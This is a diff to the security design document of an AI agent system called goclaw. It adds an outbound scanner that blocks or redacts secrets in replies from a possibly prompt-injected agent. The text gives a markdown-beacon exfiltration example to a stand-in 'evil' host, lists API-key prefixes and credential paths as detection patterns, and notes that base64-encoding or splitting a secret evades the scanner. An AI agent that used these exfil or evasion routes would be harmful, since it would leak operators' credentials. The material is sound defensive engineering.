@@ -258,6 +258,49 @@ before reaching the agent:
 - There is no path where an unauthorized sender's message reaches the agent
   without an explicit allow or a completed approval.
 
+## Outbound content scanning: bounding what the agent can send
+
+Containment bounds what the agent can REACH; it does not bound what the agent puts
+in a reply. The delivery path (`internal/delivery`) authorizes WHERE a message may
+go (origin chat always, other targets only with an `agent_destinations` row), but
+authorization says nothing about the message CONTENT. So an authorized channel can
+become an exfiltration channel: a prompt-injected agent that is asked to paste a
+secret it legitimately holds (its own env on the raw-key path, a value it read in a
+mounted file, the conversation) would have that reply delivered. A markdown image or
+link to an attacker host with a payload in the query string (`![](https://evil/?d=...)`)
+leaks on render the same way.
+
+`internal/outscan` is a deterministic, fail-closed scanner that runs on each reply
+just before it is sent (after directive interception, so it sees the exact text that
+will go out). It is **defense-in-depth BENEATH containment, not a replacement** for
+it, and it is deliberately narrow so it stays high-precision rather than a heuristic
+guessing game:
+
+- **High-precision patterns only.** Private-key armor (`-----BEGIN ... PRIVATE
+  KEY-----`) and known-prefix API tokens (Anthropic `sk-ant-`, GitHub `ghp_`/
+  `github_pat_`, AWS `AKIA…`, Slack, Stripe `sk_live_`, Google `AIza…`). Each match
+  is a recognizable secret SHAPE, never "this looks instruction-like".
+- **Exact literal needles for this container's injected secrets.** On the raw-key
+  fallback path the container env holds the real `ANTHROPIC_API_KEY` /
+  `CLAUDE_CODE_OAUTH_TOKEN` / `GH_TOKEN`; the host passes those exact values to the
+  scanner as literal needles. A reply echoing one is a hard block, with zero false
+  positives. On the credential-proxy path the container holds only `placeholder`, so
+  there is no real value to leak and the needle set is empty.
+- **Block vs. redact.** Unambiguous, whole-payload hits (a private-key block, a
+  beacon URL, an exact injected-secret needle) are hard-blocked: delivery stops, the
+  row is marked failed (terminal, so a runner that rewrites `outbound.db` cannot
+  resurrect it past the ledger), and a `delivery.blocked` event is recorded.
+  Prefix-pattern key hits are redacted in place (`[REDACTED]`) and the rest of the
+  reply is still delivered, so a single false-positive span does not silently drop a
+  legitimate answer.
+
+What this is explicitly NOT: an inbound prompt-injection filter. Scanning untrusted
+INPUT with regexes invites bypass and false confidence, and containment already
+handles input by not trusting it. This scans the trusted-path OUTPUT for a small set
+of things that must never leave, which is a tractable, high-precision problem. The
+scanner is a config seam (`delivery.WithScanner`); with no scanner wired the delivery
+path is unchanged.
+
 ## Filesystem and data isolation
 
 - **Session keys** derive from external chat input (`channel:chatID`) but are
@@ -270,7 +313,16 @@ before reaching the agent:
   Host paths are symlink-resolved before the allowlist check (no symlink escape),
   rejected if they still contain `..`, and the container path is rejected if it is
   non-absolute or contains a colon (no `-v host:container:opts` injection). RW
-  mounts get `:Z`, RO mounts `:ro,Z` (SELinux private relabel).
+  mounts get `:Z`, RO mounts `:ro,Z` (SELinux private relabel). Note this is an
+  ALLOWLIST (deny by default), which is stronger than a denylist of forbidden paths
+  (allow by default, leak on omission): nothing is mounted unless an entry permits
+  it. A regression test (`mounts_test.go`) asserts that a representative set of
+  sensitive locations (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc`,
+  `~/.git-credentials`, `~/.config/gh`, the password store, `.env`, …) is
+  unreachable under a normally-scoped allowlist, both directly and via a symlink
+  planted inside an allowed directory. The remaining operator footgun is writing an
+  over-broad entry (e.g. allowlisting `$HOME` rw, which then legitimately permits
+  `~/.ssh`): the validator honors the allowlist, so keep entries narrow.
 - **SQL** is parameterized throughout; no user-derived value is concatenated into
   a query.
 - The two-DB-per-session boundary keeps writers separate: the host owns
@@ -330,6 +382,13 @@ host, this layer defends a NARROWER scenario at real cost.
   fallback, a direct env key, is fully supported; with it the agent holds the real token.
   Using the proxy is the more secure choice, but NOT using it (and accepting the agent
   holds the key) is a defensible call for a personal deployment.
+- The **outbound content scanner** is the send-side analog of the proxy's read-side
+  protection, and the honest read is similar: it cleanly closes the OBVIOUS exfil
+  paths (the agent echoes its own injected token, or emits a markdown beacon) at
+  near-zero cost and zero false positives for the exact-needle case, but a
+  determined injected agent can transform a secret to evade the pattern set. It is
+  worth keeping precisely because it is cheap and deterministic and composes with
+  containment; it is not worth believing it makes exfiltration impossible.
 - The **plugin secret-read scan** is best-effort and trivially evadable (see "Installing a
   plugin"). The real protection is the env ALLOWLIST (the plugin never receives the
   secret var). The scan is defense-in-depth bordering on ceremony when you vet what you
@@ -361,6 +420,16 @@ choice (`GOCLAW_*` env / `goclaw auth`); the container, gate, and mounts are not
   stores (`goclaw auth add`) a credential whose target host is controlled by an
   attacker, that host could capture the injected token. Only add credentials for
   hosts you trust.
+- **Outbound exfil beyond the scanned shapes.** The outbound content scanner
+  (`internal/outscan`) catches recognizable secret SHAPES and this container's exact
+  injected token values, but it is pattern-based: a secret the agent base64-encodes,
+  splits across lines, paraphrases, or otherwise transforms before replying will not
+  match, and the agent can still narrate sensitive content it legitimately read. The
+  scanner raises the bar on the obvious exfil paths (echoing a key, a markdown
+  beacon) as defense-in-depth; it is NOT a guarantee that no secret can ever leave
+  through a reply. Treat any data the agent can read as data it could, in principle,
+  describe. The load-bearing control remains containment limiting what the agent can
+  read in the first place.
 - **Container capability posture.** The container is non-root (`--user 1000:1000`)
   and rootless, but runs with Podman's DEFAULT capability set: goclaw does not add
   `--cap-drop=ALL`, `--security-opt=no-new-privileges`, a custom seccomp profile, or
